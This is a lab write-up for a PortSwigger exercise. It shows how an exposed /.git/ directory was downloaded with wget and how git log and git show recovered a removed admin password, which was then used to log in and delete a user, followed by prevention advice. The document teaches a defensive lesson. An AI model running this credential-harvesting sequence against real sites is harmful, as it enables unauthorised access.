# Information Disclosure in Version Control History


**Difficulty:** Practitioner

**Category:** Information Disclosure / Version Control History

**Status:** Solved ✅



## Overview



This lab demonstrates how exposing a Git repository can lead to **information disclosure**.



The application exposed its `/.git/` directory. By downloading the Git repository and inspecting its commit history, we found a previous 

commit containing a hard-coded administrator password that had been removed from the current version of the configuration.



The key lesson is:



> Removing a secret from the current source code does not remove it from Git history.



PortSwigger identifies exposed version-control history as a common source of information disclosure and notes that Git data may contain 
historical changes and sensitive information in diffs.



---



## 1. Discover the Exposed Git Repository



We first requested:



```http

GET /.git/ HTTP/2

Host: LAB-ID.web-security-academy.net

```



The server returned:



```text

HTTP/2 200 OK

```



and exposed Git-related files and directories such as:



```text

HEAD

config

index

objects/

refs/

logs/

```




This confirmed that the `.git` directory was publicly accessible.



---



## 2. Download the Git Repository



We used:



```bash

wget -r https://LAB-ID.web-security-academy.net/.git/

```



Then entered the downloaded directory:



```bash

cd 0a7f00e304ace4018010c1ed00b300e0.web-security-academy.net

```



Because `.git` is a hidden directory, we used:



```bash

ls -la

```



to verify that it had been downloaded.




---



## 3. Fix wget-generated Fake References



`wget -r` also downloaded directory listing pages as `index.html`.



This caused Git errors such as:



```text

fatal: bad object refs/heads/index.html

```



and later:



```text

fatal: bad object refs/index.html
```



and:



```text

fatal: bad object refs/tags/index.html

```



We removed only these fake references:


```bash


rm -f .git/refs/heads/index.html

rm -f .git/refs/index.html

rm -f .git/refs/tags/index.html

```



We did **not** remove anything from `.git/objects`, because those are actual Git objects required for the repository history.



---



## 4. Explore the Git History




We ran:



```bash

git log --all --oneline

```



The result was:




```text

a211762 (HEAD -> master) Remove admin password from config

e77c43b Add skeleton admin panel

```



The commit:




```text

a211762 Remove admin password from config

```



was particularly interesting.



---



## 5. Inspect the Suspicious Commit



We used:



```bash


git show a211762

```


The relevant diff was:



```diff


-ADMIN_PASSWORD=7h6op841hj11x5z6t7ue


+ADMIN_PASSWORD=env('ADMIN_PASSWORD')


```




The developer had replaced the hard-coded password with an environment variable.



However, the previous password remained visible in the commit diff.



The leaked administrator password was:



```text

7h6op841hj11x5z6t7ue

```



Git's official documentation states that `git show` displays commit information and the textual diff introduced by the commit.




---



## 6. Exploitation



We logged in using:



```text

Username: administrator

Password: 7h6op841hj11x5z6t7ue

```



Then accessed the admin interface:



```text

/admin

```



and deleted:




```text


carlos

```




The lab was successfully solved.



---




## Why Did This Work?


The developer removed the password from the current configuration:


```text

ADMIN_PASSWORD=env('ADMIN_PASSWORD')

```



but the previous commit still contained:



```text

ADMIN_PASSWORD=7h6op841hj11x5z6t7ue

```


Git stores project history as a series of commits, and previous commits can be inspected even when their changes are no longer present in 

the current version.


The attack therefore looked like:



```text

Exposed /.git

      ↓

Download repository

      ↓

Inspect Git history
      ↓

Find suspicious commit

      ↓

Inspect commit diff

      ↓
Recover leaked password

      ↓
Authenticate as administrator
      ↓


Delete carlos
```


---


## Key Takeaway




When you discover an exposed:



```text

/.git/

```



always investigate the repository history.



Useful commands include:



```bash

git log --all --oneline


```





and:



```bash
git show <commit>

```






Look for commits involving:



```text

passwords

credentials

API keys

tokens


configuration files

security fixes

```



A secret that was removed from the current source code may still be recoverable from an earlier commit.



---



## Commands Used



```bash

wget -r https://LAB-ID.web-security-academy.net/.git/



cd LAB-DIRECTORY



ls -la


git log --all --oneline



git show a211762

```



Cleanup for the fake `wget` references:



```bash

rm -f .git/refs/heads/index.html

rm -f .git/refs/index.html

rm -f .git/refs/tags/index.html
```




---




## Prevention



* Never expose `.git` directories in production.

* Do not commit passwords, API keys, or other secrets to source control.

* Use environment variables or dedicated secret-management solutions.

* Removing a secret from the latest version is not enough if it has already been committed.

* Rotate compromised credentials instead of relying only on deleting them from the source code.



## References



* PortSwigger — Information Disclosure: Version Control History

* Git Documentation — `git show`

* Git Documentation — Git User Manual / History

